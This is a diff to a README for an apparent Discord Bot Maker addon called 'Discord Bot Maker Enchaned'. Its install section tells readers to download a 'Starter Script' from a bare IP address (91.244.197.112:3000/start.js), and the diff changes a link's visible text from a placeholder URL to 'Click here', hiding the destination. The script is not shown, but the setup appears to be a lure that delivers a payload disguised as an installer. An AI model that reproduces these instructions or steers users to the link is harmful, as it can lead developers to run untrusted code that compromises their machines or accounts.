@@ -4,7 +4,7 @@ Discord Bot Maker Enchaned is an addon/package for "Discord Bot Maker" that enha
 
 ## Installing  DBM-E
 <a href="http://91.244.197.112:3000/start.js" target="_blank"></a>
-<a href="http://91.244.197.112:3000/start.js">http://example.com</a>
+<a href="http://91.244.197.112:3000/start.js">Click here</a>
 
 First, [**Click Here**](http://91.244.197.112:3000/start.js) To Download The **Starter Script.**
 
